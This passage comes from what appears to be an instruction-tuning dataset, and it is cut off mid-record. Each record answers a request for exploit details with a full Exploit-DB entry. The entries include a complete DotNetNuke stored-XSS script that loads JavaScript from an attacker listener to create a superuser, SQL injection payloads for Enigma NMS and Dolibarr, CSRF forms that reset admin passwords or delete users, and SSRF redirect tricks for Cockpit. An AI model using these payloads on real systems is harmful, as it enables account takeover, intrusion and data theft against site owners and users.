            "File": "exploits/multiple/webapps/46820.txt",
            "Description": "Cortex Unshortenlink Analyzer < 1.1 - Server-Side Request Forgery",
            "Date Published": "2019-05-10",
            "Author": "Alexandre Basquin",
            "Type": "webapps",
            "Platform": "multiple",
            "Port": "",
            "Date Added": "2019-05-10",
            "Date Updated": "2019-05-13",
            "Verified": "1",
            "Codes": [
                "CVE-2019-7652"
            ],
            "Tags": [
                "Server-Side Request Forgery (SSRF)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Cortex Unshortenlink Analyzer < 1.1 - Server-Side Request Forgery\n# Date: 2/26/2019\n# Exploit Author: Alexandre Basquin\n# Vendor Homepage: https://blog.thehive-project.org\n# Software Link: https://github.com/TheHive-Project/Cortex\n# Version: Cortex <= 2.1.3\n# Tested on: 2.1.3\n# CVE : CVE-2019-7652\n\n# Exploit description\n\nThe \"UnshortenLink_1_0\" analyzer used by Cortex contains an SSRF vulnerability \n\n\nPOC:\n\n1. Create a new analysis\n\n2. Select Data Type \"URL\"\n\n3. Put your SSRF payload in the Data parameter (e.g. \"http://127.0.0.1:22\")\n\n4. Result can be seen in the main dashboard.\n\n\nReported to TheHive Project by Alexandre Basquin on 1/24/2019\n\nThe issue has been fixed in UnshortenLink 1.1 released within Cortex-analyzers 1.15.2\n\nReferences:\n\nhttps://blog.thehive-project.org/2019/02/11/unshortenlink-ssrf-and-cortex-analyzers-1-15-2/"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47448",
        "output": {
            "ID": "47448",
            "File": "exploits/multiple/webapps/47448.py",
            "Description": "DotNetNuke < 9.4.0 - Cross-Site Scripting",
            "Date Published": "2019-10-01",
            "Author": "MaYaSeVeN",
            "Type": "webapps",
            "Platform": "multiple",
            "Port": "80",
            "Date Added": "2019-10-01",
            "Date Updated": "2019-10-01",
            "Verified": "0",
            "Codes": [
                "CVE-2019-12562"
            ],
            "Tags": [
                "Cross-Site Scripting (XSS)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Stored Cross-Site Scripting in DotNetNuke (DNN) Version before 9.4.0\n# Exploit Description : This exploit will add a superuser to target DNN website. \n# Exploit Condition : Successful exploitation occurs when an admin user visits a notification page.\n# Exploit Author: MAYASEVEN\n# CVE : CVE-2019-12562 (https://www.cvedetails.com/cve/CVE-2019-12562/)\n# Github : https://github.com/MAYASEVEN/CVE-2019-12562\n# Website : https://mayaseven.com\n\nimport urllib.request\nfrom bs4 import BeautifulSoup\n\n####################################################################################################\n################################## Config the variables here #######################################\n####################################################################################################\nTARGET_URL = \"http://targetdomain/DotNetNuke\"\nUSERNAME = \"MAYASEVEN\"   # At least five characters long\nPASSWORD = \"P@ssw0rd\" # At least 0 non-alphanumeric characters, At least 7 characters\nEMAIL = \"research@mayaseven.com\" # Change email to any you want\n# A web server for listening an event\nLISTEN_URL = \"http://yourdomain.com:1337\"\n#####################################################################################################\n#####################################################################################################\n#####################################################################################################\n\n# Payload to add a superuser to website\nPAYLOAD = \"John<script src='\"+LISTEN_URL+\"/payload.js'></script>\"\nFILE_CONTENT = \"\"\"var token = document.getElementsByName(\"__RequestVerificationToken\")[0].value;\nvar xhttp = new XMLHttpRequest();\nvar params = \"{'firstName':'\"\"\"+USERNAME+\"\"\"','lastName':'\"\"\"+USERNAME+\"\"\"','email':'\"\"\"+EMAIL+\"\"\"','userName':'\"\"\"+USERNAME+\"\"\"','password':'\"\"\"+PASSWORD+\"\"\"','question':'','answer':'','randomPassword':false,'authorize':true,'notify':false}\";\nxhttp.onreadystatechange = function() {\n    if (this.readyState == 4 && this.status == 200) {\n        var returnhttp1 = new XMLHttpRequest();\n        returnhttp1.open(\"GET\", '\"\"\"+LISTEN_URL+\"\"\"/Added_the_user');\n        returnhttp1.send();\n        var xhttp2 = new XMLHttpRequest();\n        var userId = JSON.parse(xhttp.responseText).userId;\n        xhttp2.onreadystatechange = function() {\n            if (this.readyState == 4 && this.status == 200) {\n                var returnhttp2 = new XMLHttpRequest();\n                returnhttp2.open(\"GET\", '\"\"\"+LISTEN_URL+\"\"\"/Make_superuser_success');\n                returnhttp2.send();\n            }\n        }\n        xhttp2.open('POST', '\"\"\"+TARGET_URL+\"\"\"/API/PersonaBar/Users/UpdateSuperUserStatus?userId='+userId+'&setSuperUser=true', true);\n        xhttp2.setRequestHeader('Content-type', 'application/json; charset=UTF-8');\n        xhttp2.setRequestHeader('RequestVerificationToken', token);\n        xhttp2.send(params);\n    }\n};\nxhttp.open('POST', '\"\"\"+TARGET_URL+\"\"\"/API/PersonaBar/Users/CreateUser', true);\nxhttp.setRequestHeader('Content-type', 'application/json; charset=UTF-8');\nxhttp.setRequestHeader('RequestVerificationToken', token);\nxhttp.send(params);\n\"\"\"\n\ndef create_payload():\n    # Create a payload.js file\n    f = open(\"payload.js\", \"w\")\n    f.write(FILE_CONTENT)\n    f.close()\n\ndef check_target():\n    global regpage\n    reg = urllib.request.urlopen(TARGET_URL+\"/Register\")\n    regpage = reg.read().decode(\"utf8\")\n    reg.close()\n    if \"dnn\" in regpage:\n       return True\n    else: return False\n\ndef exploit():\n    # Fetching parameter from regpage\n    soup = BeautifulSoup(regpage, 'html.parser')\n    formhtml = soup.find(\"div\", {\"id\": \"dnn_ctr_Register_userForm\"})\n    inputdata = BeautifulSoup(regpage, 'html.parser').findAll(\"input\")\n    param = {}\n    print(\" [+] Fetching DNN random parameter name.\")\n    for i in soup.select('input[name*=\"_TextBox\"]'):\n        print(\" [+]\", i[\"aria-label\"],\":\", i[\"name\"])\n        param[i[\"aria-label\"]] = i[\"name\"]\n    ScriptManager = \"dnn$ctr$Register_UP|dnn$ctr$Register$registerButton\"\n    __EVENTVALIDATION = soup.find(\"input\", {\"id\": \"__EVENTVALIDATION\"})[\"value\"]\n    __VIEWSTATE = soup.find(\"input\", {\"id\": \"__VIEWSTATE\"})[\"value\"]\n    __EVENTTARGET = \"dnn$ctr$Register$registerButton\"\n\n    # Posting data to target\n    headers = {'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8'}\n    data = {'ScriptManager': ScriptManager, '__EVENTVALIDATION': __EVENTVALIDATION, '__VIEWSTATE': __VIEWSTATE, '__EVENTTARGET': __EVENTTARGET,\n        param['Username']: \"dummy_\"+USERNAME, param[\"Password\"]: PASSWORD, param[\"PasswordConfirm\"]: PASSWORD, param[\"DisplayName\"]: PAYLOAD, \"dummy_\"+param[\"Email\"]: EMAIL, '__ASYNCPOST': 'true'}\n    data = urllib.parse.urlencode(data).encode()\n    req = urllib.request.Request(TARGET_URL+\"/Register\", data=data, headers=headers)\n    response = urllib.request.urlopen(req)\n    if \"An email with your details has been sent to the Site Administrator\" in response.read().decode(\"utf8\"):\n        create_payload()\n        return True\n    elif \"A user already exists\" in response.read().decode(\"utf8\"):\n        print(\" [!] The user already exists\")\n        return False \n    elif \"The Display Name is invalid.\" in response.read().decode(\"utf8\"):\n        print(\" [!] DotNetNuke verion already been patched\")\n    else: return False\n\ndef main():\n    print(\"[ Checking the target ]\")\n    if(check_target()):\n        print(\" [+] Target is DNN website.\")\n        print(\" [+] URL: %s\" % TARGET_URL)\n    else:\n        print(\" [!] Target is not DNN website and exploit will not working.\")\n        return\n    print(\"[ Running an exploit ]\")\n    if(exploit()):\n        print(\"[ Successful exploited the target ]\")\n        print(\"> Creating a payload.js file in current directory.\")\n        print(\"> You have to serve the web server and place payload.js on it.\")\n        print(\"> And waiting admin to open a notification then the user will be added.\")\n        print(\"> Username: %s\" % USERNAME)\n        print(\"> Password: %s\" % PASSWORD)\n    else:\n        print(\" [!] Failed to exploit the target.\")\n        return\n\nif(__name__ == \"__main__\"):\n    main()"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47365",
        "output": {
            "ID": "47365",
            "File": "exploits/multiple/webapps/47365.txt",
            "Description": "Enigma NMS 65.0.0 - SQL Injection",
            "Date Published": "2019-09-09",
            "Author": "xerubus",
            "Type": "webapps",
            "Platform": "multiple",
            "Port": "80",
            "Date Added": "2019-09-09",
            "Date Updated": "2019-09-11",
            "Verified": "0",
            "Codes": [
                "CVE-2019-16065"
            ],
            "Tags": [
                "SQL Injection (SQLi)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "#--------------------------------------------------------------------#\n# Exploit Title: Enigma NMS search_pattern SQL Injection             #\n# Date:  21 July 2019                                                #\n# Author: Mark Cross (@xerubus | mogozobo.com)                       #\n# Vendor: NETSAS Pty Ltd                                             #\n# Vendor Homepage:  https://www.netsas.com.au/                       #\n# Software Link: https://www.netsas.com.au/enigma-nms-introduction/  #\n# Version: Enigma NMS 65.0.0                                         #\n# CVE-IDs: CVE-2019-16065                                            #\n# Full write-up: https://www.mogozobo.com/?p=3647                    #\n#--------------------------------------------------------------------#\n        _  _\n  ___ (~ )( ~)\n /   \\_\\ \\/ /   \n|   D_ ]\\ \\/        -= Enigma SQLi by @xerubus =-    \n|   D _]/\\ \\     -= We all have something to hide =-\n \\___/ / /\\ \\\\\n      (_ )( _)\n      @Xerubus    \n\nRequest: http://<enigma_nms_ipaddr>/cgi-bin/protected/manage_hosts_short.cgi?action=search_proceed&search_pattern=\nVulnerable Parameter:  search_pattern (GET)\nPayload: action=search_proceed&search_pattern=a%' AND SLEEP(5) AND '%'='"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 48177",
        "output": {
            "ID": "48177",
            "File": "exploits/php/webapps/48177.txt",
            "Description": "60CycleCMS - 'news.php' SQL Injection",
            "Date Published": "2020-03-09",
            "Author": "Unkn0wn",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2020-03-09",
            "Date Updated": "2020-03-10",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "SQL Injection (SQLi)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.com60cycleCMS.2.5.2.zip",
            "Source URL": "",
            "Exploit": "# Exploit Title: 60CycleCMS  - 'news.php' Multiple vulnerability\n# Google Dork: N/A\n# Date: 2020-02-10\n# Exploit Author: Unkn0wn\n# Vendor Homepage: http://davidvg.com/\n# Software Link: https://www.opensourcecms.com/60cyclecms\n# Version: 2.5.2\n# Tested on: Ubuntu\n# CVE : N/A\n---------------------------------------------------------\n\nSQL Injection vulnerability:\n----------------------------\nin file /common/lib.php Line 64 -73\n*\nfunction getCommentsLine($title)\n{\n$title = addslashes($title);\n$query = \"SELECT `timestamp` FROM `comments` WHERE entry_id= '$title'\";\n// query MySQL server\n$result=mysql_query($query) or die(\"MySQL Query fail: $query\");\n$numComments = mysql_num_rows($result);\n$encTitle = urlencode($title);\nreturn '<a href=\"post.php?post=' . $encTitle . '#comments\" >' . $numComments . ' comments</a>';\n}\nlib.php line 44:\n*\n$query = \"SELECT `timestamp`,`author`,`text` FROM `comments` WHERE `entry_id` ='$title' ORDER BY `timestamp` ASC\";\n\n*\n*\nnews.php line 3:\n*\nrequire 'common/lib.php';\n*\nThen in line 15 return query us:\n*\n$query = \"SELECT MAX(`timestamp`) FROM `entries\n*\n\nhttp://127.0.0.1/news.php?title=$postName[SQL Injection]\n----------------------------\nCross Site-Scripting vulnerability:\nFile news.php in line: 136-138 :\n*\n$ltsu = $_GET[\"ltsu\"];\n$etsu = $_GET[\"etsu\"];\n$post = $_GET[\"post\"];\n*\nget payload us and printEnerty.php file in line 26-27:\n*\n<? echo '<a class=\"navLink\" href=\"index.php?etsu=' . $etsu . '\">Older ></a>';\n<? echo '<a class=\"navLink\" href=\"index.php?ltsu=' . 0 . '\">Oldest >>|</a>';\n*\n\nprint it for us!\nhttp://127.0.0.1/index.php?etsu=[XSS Payloads]\nhttp://127.0.0.1/index.php?ltsu=[XSS Payloads]\n----------------------------------------------------------\n# Contact : 0x9a@tuta.io\n# Visit: https://t.me/l314XK205E\n# @ 2010 - 2020\n# Underground Researcher"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47217",
        "output": {
            "ID": "47217",
            "File": "exploits/php/webapps/47217.txt",
            "Description": "Adive Framework 2.0.7 - Cross-Site Request Forgery",
            "Date Published": "2019-08-08",
            "Author": "Pablo Santiago",
            "Type": "webapps",
            "Platform": "php",
            "Port": "80",
            "Date Added": "2019-08-08",
            "Date Updated": "2019-08-08",
            "Verified": "0",
            "Codes": [
                "CVE-2019-14346"
            ],
            "Tags": [
                "Cross-Site Request Forgery (CSRF)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comadive-php7-master.zip",
            "Source URL": "",
            "Exploit": "# Exploit Title: Adive Framework 2.0.7 \u2013 Cross-Site Request Forgery (CSRF)\n# Date:02/08/2019.\n# Exploit Author: Pablo Santiago\n# Vendor Homepage: https://adive.es\n# Software Link: https://github.com/ferdinandmartin/adive-php7\n# Version: 2.0.7\n# Tested on: Windows and Kali linux\n# CVE :2019-14346\n\n# 1. Technical Description:\n# Adive Framework 2.0.7 and possibly before are affected by Cross-Site\n#Request Forgery vulnerability, an attacker could change any user\npassword.\n\n# 2. Proof Of Concept (CODE):\n\n<html>\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"http://localhost/adive/admin/config\" method=\"POST\">\n      <input type=\"hidden\" name=\"userName\" value=\"admin\" />\n      <input type=\"hidden\" name=\"confPermissions\" value=\"1\" />\n      <input type=\"hidden\" name=\"pass\" value=\"1234\" />\n      <input type=\"hidden\" name=\"cpass\" value=\"1234\" />\n      <input type=\"hidden\" name=\"invokeType\" value=\"web\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n  </body>\n</html>\n\n# 3. References:\n# https://hackpuntes.com/cve-2019-14346-adive-framework-2-0-7-cross-site-request-forgery/\n# https://imgur.com/apuZa9q"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47966",
        "output": {
            "ID": "47966",
            "File": "exploits/php/webapps/47966.txt",
            "Description": "Adive Framework 2.0.8 - Cross-Site Request Forgery (Change Admin Password)",
            "Date Published": "2020-01-28",
            "Author": "Sarthak Saini",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2020-01-28",
            "Date Updated": "2020-02-03",
            "Verified": "1",
            "Codes": [
                "CVE-2020-7991"
            ],
            "Tags": [
                "Cross-Site Request Forgery (CSRF)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comadive-php7-master.zip",
            "Source URL": "",
            "Exploit": "# Exploit Title:  Adive Framework 2.0.8 - Cross-Site Request Forgery (Change Admin Password)\n# Exploit Author: Sarthak Saini\n# Date: 2020-01-18\n# Vendor Link : https://www.adive.es/\n# Software Link: https://github.com/ferdinandmartin/adive-php7\n# Version: 2.0.8\n# CVE:CVE-2020-7991\n# Category: Webapps\n# Tested on: windows64bit / mozila firefox \n# \n#\n|--!>\n\n|----------------------------------------------------------------------------------\n\n1) Persistent Cross-site Scripting at user add page \n\nDescription : The parameter 'userUsername=' is vulnerable to Stored Cross-site scripting\n \nPayload:- <script>alert(1)</script>\n\nPOST /admin/user/add HTTP/1.1\nHost: 192.168.2.5\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 62\nOrigin: http://192.168.2.5\nDNT: 1\nConnection: close\nReferer: http://192.168.2.5/admin/user/add\nCookie: PHPSESSID=3rglrbjn0372tf97voajlfb1j4\nUpgrade-Insecure-Requests: 1\n\nuserName=test&userUsername=<script>alert('xss')</script>&pass=test&cpass=test&permission=3\n\n\n|----------------------------------------------------------------------------------\n\n\n2) account takeover - cross side request forgery (Change Admin Password)\n\n\nDescription : attacker can craft a malicious javascript and attach it to the stored xss, when admin visits the /admin/user page the payload will trigger.\n\n-> Save the payload as exp.js\n\n-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==--==-\nfunction execute()\n{\n  var nuri =\"http://192.168.2.5/admin/config\";\n  xhttp = new XMLHttpRequest();\n  xhttp.open(\"POST\", nuri, true);\n  xhttp.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");\n  xhttp.withCredentials = \"true\";\n  var body = \"\";\n  body += \"\\r\\n\\r\\n\";\n  body += \n\t\"userName=Administrator&confPermissions=1&pass=hacked@123&cpass=hacked@123&invokeType=web\";\n  xhttp.send(body);\n  return true;\n}\n\nexecute();\n-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==--==-\n\n-> Start a server and host the exp.js. Send the exp.js file in the xss payload\n\nPayload:- <script src=\"http://192.168.2.5/exp.js\"></script>\n\nPOST /admin/user/add HTTP/1.1\nHost: 192.168.2.5\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 143\nOrigin: http://192.168.2.5\nDNT: 1\nConnection: close\nReferer: http://192.168.2.5/admin/user/add\nCookie: PHPSESSID=3rglrbjn0372tf97voajlfb1j4\nUpgrade-Insecure-Requests: 1\n\nuserName=%3Cscript+src%3D%22http%3A%2F%2F192.168.2.5%2Fexp.js%22%3E%3C%2Fscript%3E&userUsername=test&pass=test&cpass=test&permission=3\n\n\n-> As soon as admin will visit the page the payload will be triggered and the admin password will be changed to hacked@123\n\n|-----------------------------------------EOF-----------------------------------------"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 44567",
        "output": {
            "ID": "44567",
            "File": "exploits/php/webapps/44567.txt",
            "Description": "Cockpit CMS 0.4.4 < 0.5.5 - Server-Side Request Forgery",
            "Date Published": "2018-05-02",
            "Author": "Qian Wu_ Bo Wang_ Jiawang Zhang",
            "Type": "webapps",
            "Platform": "php",
            "Port": "80",
            "Date Added": "2018-05-02",
            "Date Updated": "2018-05-02",
            "Verified": "0",
            "Codes": [
                "CVE-2018-9302"
            ],
            "Tags": [
                "Server-Side Request Forgery (SSRF)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comcockpit-0.5.5.tar.gz",
            "Source URL": "",
            "Exploit": "# SSRF\uff08Server Side Request Forgery\uff09 in Cockpit 0.4.4-0.5.5 (CVE-2018-9302)\n\nCockpit CMS repairs CVE-2017-14611, but it can be bypassed, SSRF still exist, affecting the Cockpit CMS 0.4.4-0.5.5 versions.I've been tested success of \"Cockpit CMS\" lastest version.\n\n## Product Download: Cockpit (https://getcockpit.com)\n\n## Vulnerability Type\uff1aSSRF\uff08Server Side Request Forgery\uff09\n\n## Attack Type : Remote\n\n## Vulnerability Description\n\nYou can edit a .php file on own server. The .php file's code example:\n\n<?php Header(\"Location: dict://127.0.0.1:3306/_0d%\");?>\n\n## Exploit\nRequest:\n\n    GET /assets/lib/fuc.js.php?url=http://myserver/redirect.php HTTP/1.1\n    Host: myserver\n    Connection: close\n    Cache-Control: max-age=0\n    Upgrade-Insecure-Requests: 1\n    User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36\n    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\n    Accept-Language: zh-CN,zh;q=0.8\n    referer:http://myserver/index.php\n\n\nModify the redirect.php file on the attacker's server.example:\n    <?php Header(\"Location: gopher://127.0.0.1:3306/_0d%\");?>\n\nIf the curl function is available,then use gopher\u3001tftp\u3001http\u3001https\u3001dict\u3001ldap\u3001imap\u3001pop3\u3001smtp\u3001telnet protocols method\uff0cif not then only use http\u3001https\u3001ftp protocol\nscan prot,example: <?php Header(\"Location: dict://127.0.0.1:3306/\");?> \n\nIf the curl function is unavailable,this vulnerability trigger need allow_url_fopen option is enable in php.ini\uff0callow_url_fopen option defualt is enable.\n\n## Versions\n\nProduct: Cockpit CMS 0.4.4-0.5.5\n\n## Impact\n\nSSRF (Server Side Request Forgery) in /assets/lib/fuc.js.php in Cockpit 0.4.4 through 0.5.5 allows remote attackers to read arbitrary files or send TCP traffic to intranet hosts via the url parameter.\n\n## Fix Code\n\nThe fix code example\uff1a\n\n    $url     = $_REQUEST['url'];\n    $content = null;\n    if (!filter_var($url, FILTER_VALIDATE_URL)) {\n\n        header('HTTP/1.0 400 Bad Request');\n        return;\n    }\n\n    // allow only http requests\n    if (!preg_match('#^http(|s)\\://#', $url)) {\n        header('HTTP/1.0 403 Forbidden');\n        return;\n    }\n    preg_match('/https*:\\/\\/(.+)/', $url, $matches);\n    $host= count($matches) > 1 ? $matches[1] : '';\n    $ip = gethostbyname($host);\n    //check private ip\n    if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE)) {\n        return\n    }\n\nand modify the line 48 :\n\n    curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 0);\n\n## Credit\n\nThis vulnerability was discovered by Qian Wu & Bo Wang & Jiawang Zhang &  National Computer Network Emergency Response Technical Team/Coordination Center of China (CNCERT/CC)\n\n## References\n\nCVE: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9302\n\n### Timeline:\n\n2018-04-03  Found Cockpit CMS vulnerability.\n\n2018-04-04  Submit vulnerability information to developers.\n\n2018-04-05  Submit CVE-ID request\n\n2018-04-28  Vendor no response, Public vulnerability information,Please Fix it."
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47973",
        "output": {
            "ID": "47973",
            "File": "exploits/php/webapps/47973.txt",
            "Description": "Cups Easy 1.0 - Cross Site Request Forgery (Password Reset)",
            "Date Published": "2020-01-29",
            "Author": "J3rryBl4nks",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2020-01-29",
            "Date Updated": "2020-01-29",
            "Verified": "0",
            "Codes": [
                "CVE-2020-8425;CVE-2020-8424"
            ],
            "Tags": [
                "Cross-Site Request Forgery (CSRF)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comcupseasylive-1.0.rar",
            "Source URL": "",
            "Exploit": "# Title: Cups Easy 1.0 - Cross Site Request Forgery (Password Reset)\n# Date: 2020-01-28\n# Exploit Author: J3rryBl4nks\n# Vendor Homepage: https://sourceforge.net/u/ajayshar76/profile/\n# Software Link: https://sourceforge.net/projects/cupseasy/files/cupseasylive-1.0/\n# Version: 1.0\n# Tested on Windows 10/Kali Rolling\n# CVE: CVE-2020-8424, CVE-2020-8425\n\n# The Cups Easy (Purchase & Inventory) 1.0 web application is vulnerable to Cross Site Request Forgery \n# that would allow an attacker to change the Admin password and gain unrestricted \n# access to the site or delete any user.\n\n# Proof of Concept Code for Password Change:\n\n<html>\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"http://SITEADDRESS/cupseasylive/passwordmychange.php\" method=\"POST\">\n      <input type=\"hidden\" name=\"username\" value=\"admin\" />\n      <input type=\"hidden\" name=\"password\" value=\"PASSWORDHERE\" />\n      <input type=\"hidden\" name=\"change\" value=\"Change\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>\n\n# Proof of concept for user delete:\n\n<html>\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"http://SITEADDRESS/cupseasylive/userdelete.php\" method=\"POST\">\n      <input type=\"hidden\" name=\"username\" value=\"admin\" />\n      <input type=\"hidden\" name=\"delete\" value=\"Delete\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47213",
        "output": {
            "ID": "47213",
            "File": "exploits/php/webapps/47213.txt",
            "Description": "Daily Expense Manager 1.0 - Cross-Site Request Forgery (Delete Income)",
            "Date Published": "2019-08-08",
            "Author": "Mr Winst0n",
            "Type": "webapps",
            "Platform": "php",
            "Port": "80",
            "Date Added": "2019-08-08",
            "Date Updated": "2019-08-08",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "Cross-Site Request Forgery (CSRF)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comexpense.zip",
            "Source URL": "",
            "Exploit": "# Exploit Title: Daily Expense Manager - CSRF (Delete Income)\n# Exploit Author: Mr Winst0n\n# Author E-mail: manamtabeshekan@gmail.com\n# Discovery Date: August 8, 2019\n# Vendor Homepage: https://sourceforge.net/projects/daily-expense-manager/\n# Tested Version: 1.0\n# Tested on: Parrot OS\n\n\n# PoC:\n\n<html>\n<body>\n\t<form action=\"http://server/homeedit.php?delincome=778\" method=\"post\">\n\t\t<input type=\"submit\" value=\"Click!\" />\n\t</form>\n</body>\n</html>"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47384",
        "output": {
            "ID": "47384",
            "File": "exploits/php/webapps/47384.txt",
            "Description": "Dolibarr ERP-CRM 10.0.1 - 'User-Agent' Cross-Site Scripting",
            "Date Published": "2019-09-13",
            "Author": "Metin Yunus Kandemir",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2019-09-13",
            "Date Updated": "2019-09-13",
            "Verified": "0",
            "Codes": [
                "CVE-2019-16197"
            ],
            "Tags": [
                "Cross-Site Scripting (XSS)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comdolibarr-10.0.1.tar.gz",
            "Source URL": "",
            "Exploit": "# Exploit Title: Dolibarr ERP/CRM 10.0.1 - User-Agent Http Header Cross\nSite Scripting\n# Exploit Author: Metin Yunus Kandemir (kandemir)\n# Vendor Homepage: https://www.dolibarr.org/\n# Software Link: https://www.dolibarr.org/downloads\n# Version: 10.0.1\n# Category: Webapps\n# Tested on: Xampp for Linux\n# CVE: CVE-2019-16197\n# Software Description : Dolibarr ERP & CRM is a modern and easy to use\nsoftware package to manage your business...\n==================================================================\n\nDescription: In htdocs/societe/card.php in Dolibarr 10.0.1, the value of\nthe User-Agent HTTP header is copied into the HTML document as plain text\nbetween tags, leading to XSS.\n\nGET /dolibarr-10.0.1/htdocs/societe/card.php HTTP/1.1\nHost: localhost\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0ab<script>alert(\"XSS\")</script>"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47370",
        "output": {
            "ID": "47370",
            "File": "exploits/php/webapps/47370.txt",
            "Description": "Dolibarr ERP-CRM 10.0.1 - SQL Injection",
            "Date Published": "2019-09-09",
            "Author": "Metin Yunus Kandemir",
            "Type": "webapps",
            "Platform": "php",
            "Port": "80",
            "Date Added": "2019-09-09",
            "Date Updated": "2019-09-10",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "SQL Injection (SQLi)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comdolibarr-10.0.1.tar.gz",
            "Source URL": "",
            "Exploit": "# Exploit Title: Dolibarr ERP/CRM - Multiple Sql Injection\n# Exploit Author: Metin Yunus Kandemir (kandemir)\n# Vendor Homepage: https://www.dolibarr.org/\n# Software Link: https://www.dolibarr.org/downloads\n# Version: 10.0.1\n# Category: Webapps\n# Tested on: Xampp for Linux\n# Software Description : Dolibarr ERP & CRM is a modern and easy to use\nsoftware package to manage your business...\n==================================================================\n\n\nactioncode (POST) - Sql injection PoC\n\nhttp request:\n\nPOST /dolibarr-10.0.1/htdocs/comm/action/card.php HTTP/1.1\nHost: localhost\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101\nFirefox/60.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer:\nhttp://localhost/dolibarr-10.0.1/htdocs/comm/action/card.php?action=edit&id=774\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 610\nCookie:\nDOLSESSID_60ec554596b730ca6f03816d85cd400a=aaf3a3b284478257b59be81cf1a70fc3\nConnection: close\nUpgrade-Insecure-Requests: 1\n\ntoken=%242y%2410%24hG2u8WGSj3ynCl99dYPZGejK322YaCxkfSRW%2FIC0mt8vk7%2FGTtU8a&action=update&id=774&ref_ext=&actioncode=[SQLi]&label=Product+created&ap=09%2F05%2F2019&apday=05&apmonth=09&apyear=2019&aphour=16&apmin=59&apsec=10&p2=09%2F05%2F2019&p2day=05&p2month=09&p2year=2019&p2hour=16&p2min=59&p2sec=10&complete=-1&location=&removedassigned=&assignedtouser=-1&socid=-1&projectid=0&priority=&fk_element=178&elementtype=product&note=Author%3A+admin%3Cbr%3E%0D%0AProduct+created&edit=Save\n\n\n\nParameter: actioncode (POST)\n    Type: boolean-based blind\n    Title: MySQL RLIKE boolean-based blind - 